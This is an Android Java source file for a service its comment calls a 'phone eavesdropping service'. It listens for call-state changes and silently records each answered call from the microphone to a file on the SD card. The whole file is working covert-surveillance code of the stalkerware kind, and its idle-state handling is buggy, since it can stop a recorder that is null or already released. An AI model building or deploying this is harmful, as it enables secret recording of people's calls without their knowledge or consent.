package com.awwhome.phonelistener.service;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.IOException;

/**
 * 电话窃听服务
 * Created by awwho on 2017/3/5.
 */
public class PhoneListenerService extends Service {

    private static final String TAG = "PhoneListenerService";
    private MediaRecorder mediaRecorder;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate: 服务被创建了 ");

        // 监听电话
        // 1.创建电话管理者实例
        TelephonyManager tmanager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);

        // 2.监听电话状态的改变
        tmanager.listen(new MyPhoneStateListener(), PhoneStateListener.LISTEN_CALL_STATE);

    }

    /**
     * 监听电话状态
     */
    private class MyPhoneStateListener extends PhoneStateListener {

        // 当电话状态发生改变时
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);

            // 电话状态
            switch (state) {
                case TelephonyManager.CALL_STATE_IDLE: // 空闲状态
                    // 停止录
                    mediaRecorder.stop();
                    // 重置mediaRecorder实例
                    mediaRecorder.reset();   // You can reuse the object by going back to setAudioSource() step
                    mediaRecorder.release(); // Now the object cannot be reused
                    break;
                case TelephonyManager.CALL_STATE_RINGING: // 响铃状态

                    Log.d(TAG, "onCallStateChanged: 准备录音机");

                    // 获取MediaRecorder实例
                    mediaRecorder = new MediaRecorder();
                    // 设置音频来源
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); // MIC单方的；VOICE_CALL双方的；
                    // 设置输出格式
                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                    // 设置音频编码
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                    // 存储位置
                    mediaRecorder.setOutputFile("/mnt/sdcard/luyin.3gp");
                    try {
                        // 准备录
                        mediaRecorder.prepare();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK: // 接听状态

                    Log.d(TAG, "onCallStateChanged: 开始录音。。。");

                    mediaRecorder.start();   // Recording is now started
                    break;

            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand: 服务启动了 ");

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        Log.d(TAG, "onDestroy: 服务被销毁了 ");
    }
}
